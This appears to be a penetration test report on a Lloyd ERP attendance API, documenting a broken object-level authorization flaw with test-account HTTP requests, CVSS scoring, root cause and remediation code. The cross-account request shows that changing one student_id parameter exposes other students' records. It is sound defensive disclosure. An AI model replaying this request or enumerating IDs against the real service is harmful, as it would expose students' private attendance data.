# Lloyd ERP Security Assessment — Broken Object Level Authorization (BOLA) Testing

**Vulnerability Reference:** FINDING-01 / OWASP API1:2023 Broken Object Level Authorization  
**Affected Endpoint:** `GET /api/attendance/student?student_id={id}`  
**Affected Component:** Lloyd ERP Attendance Ledger Controller  
**Testing Methodology:** Controlled Cross-Account Authorization Testing (Test Account A vs Test Account B)  

---

## 1. Vulnerability Architecture & Context

Broken Object Level Authorization (BOLA) occurs when an API endpoint handles user-supplied object identifiers without verifying that the authenticated user possesses legitimate authorization to access the requested resource.

In Lloyd ERP, the `/api/attendance/student` endpoint requires a client-supplied query parameter `student_id`.

```text
┌────────────────────────────────────────────────────────────────────────┐
│                        CONTROLLED BOLA TEST SUITE                      │
└────────────────────────────────────────────────────────────────────────┘

  [ TEST IDENTITY A ]                              [ TEST IDENTITY B ]
  • Identity: <TEST_STUDENT_A>                     • Identity: <TEST_STUDENT_B>
  • Profile ID: 28960                              • Profile ID: 28961
  • Bearer Token: <TOKEN_A>                        • Bearer Token: <TOKEN_B>
          │                                                │
          ▼                                                ▼
┌───────────────────────────────────┐            ┌───────────────────────────────────┐
│ TEST CASE 1: Baseline Self-Access │            │ TEST CASE 2: Cross-Account Access │
│ Bearer: <TOKEN_A>                 │            │ Bearer: <TOKEN_A>                 │
│ Target: ?student_id=28960         │            │ Target: ?student_id=28961         │
└─────────────────┬─────────────────┘            └─────────────────┬─────────────────┘
                  │                                                │
                  ▼                                                ▼
         EXPECTED: HTTP 200                               EXPECTED: HTTP 403 / 404
         ACTUAL:   HTTP 200 [ALLOW]                       ACTUAL:   HTTP 200 [UNAUTHORIZED ALLOW]
```

---

## 2. Test Execution & Evidence

### Test Case 1: Baseline Legitimate Self-Access (Test Account A)
- **Precondition:** Authenticated as Test Account A (`student_id: 28960`).
- **Request:**
  ```http
  GET /api/attendance/student?student_id=28960&page=1&page_size=10&sort_by=attendance_date&sort_dir=desc HTTP/1.1
  Host: erp.lloydcollege.in
  Authorization: Bearer <TOKEN_A>
  Accept: application/json
  User-Agent: LloydERP-AndroidWidget/1.0
  ```
- **Observed Response:**
  ```http
  HTTP/1.1 200 OK
  Content-Type: application/json; charset=utf-8

  {
    "status": true,
    "data": [
      {
        "id": 98214,
        "student_id": 28960,
        "student_name": "<TEST_STUDENT_A>",
        "attendance_date": "2026-10-01",
        "status": "Present",
        "subject_name": "Applied Mathematics-I",
        "created_by_name": "Dr. Digvijay Singh"
      }
    ],
    "meta": { "total_items": 74, "current_page": 1 }
  }
  ```
- **Evaluation:** **ALLOW (Expected)**. Student accesses their own academic records.

---

### Test Case 2: Cross-Account Parameter Tampering (Test Account A accessing Test Account B)
- **Precondition:** Authenticated as Test Account A (`<TOKEN_A>`), but supplying the identifier of authorized peer Test Account B (`student_id: 28961`).
- **Request:**
  ```http
  GET /api/attendance/student?student_id=28961&page=1&page_size=10&sort_by=attendance_date&sort_dir=desc HTTP/1.1
  Host: erp.lloydcollege.in
  Authorization: Bearer <TOKEN_A>
  Accept: application/json
  User-Agent: LloydERP-AndroidWidget/1.0
  ```
- **Expected Behavior:** `HTTP 403 Forbidden` or `HTTP 404 Not Found`. The server must deny the request because the token identity (`28960`) does not match the requested object (`28961`).
- **Actual Observed Behavior:**
  ```http
  HTTP/1.1 200 OK
  Content-Type: application/json; charset=utf-8

  {
    "status": true,
    "data": [
      {
        "id": 98310,
        "student_id": 28961,
        "student_name": "<TEST_STUDENT_B>",
        "roll_no": "<REDACTED_ROLL_B>",
        "attendance_date": "2026-10-01",
        "status": "Absent",
        "class_lecture": "2",
        "subject_name": "Applied Chemistry",
        "created_by_name": "Dr. Vivek Das"
      }
    ],
    "meta": { "total_items": 68, "current_page": 1 }
  }
  ```
- **Evaluation:** **FAIL (Vulnerability Confirmed)**. The server validates that `<TOKEN_A>` is a valid student token, but completely fails to check if the caller owns the student record identified by `student_id=28961`.

---

## 3. Vulnerability Deep Dive

### 3.1 Severity Rating
- **CVSS v3.1 Base Score:** **8.6 (High / Critical)**  
  `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N`
- **OWASP Classification:** **API1:2023 — Broken Object Level Authorization**

### 3.2 Root Cause Analysis
- **Symptom:** A student can view another student's detailed daily attendance ledger by altering the URL query parameter.
- **Contributing Factor:** The ERP backend implementation provides two different API architectures: a modern session-bound controller (`/student/me/*`) and an older or administrative controller (`/attendance/student`) that was repurposed for the student UI.
- **Root Cause:** Missing Server-Side Access Control Layer (ACL). The backend database query filters solely on `WHERE student_id = ?` without enforcing `AND student_id = authenticated_user.id`.

### 3.3 Security & Privacy Impact
1. **Academic Privacy Violation**: Detailed attendance reveals a student's exact physical presence or absence on campus at specific hourly periods.
2. **Faculty Profiling**: Exposes teacher schedules and mark timestamps.
3. **Data Harvesting**: Although automated enumeration was strictly out of scope for this audit, the predictability of sequential integer IDs (`28960`, `28961`) would allow horizontal data harvesting by malicious actors.

---

## 4. Remediation Recommendations

### 4.1 Server-Side Fix (Authoritative)
1. **Adopt Session Binding**:
   - Create a dedicated endpoint `GET /api/student/me/attendance-logs`.
   - Extract the student identity strictly from the cryptographically verified JWT payload (`req.user.id`).
2. **Enforce Row-Level Security**:
   - If `/api/attendance/student` must accept `student_id` for faculty or administrative roles, implement a role-based authorization check:
     ```python
     # Example Backend Policy Enforcement
     if current_user.role == 'student':
         if requested_student_id != current_user.id:
             return HttpResponseForbidden("Access denied: You cannot view peer attendance.")
     ```

### 4.2 Client-Side Safeguards (Android Application)
- The Android client must **never allow user manipulation** of `studentId`.
- Always bind `studentId` strictly to the verified ID returned by `/api/auth/login` (`user.id`) or `/api/student/me/monthly-attendance` (`student_id`).
- Reject any intent, deep link, or external input attempting to override `studentId`.
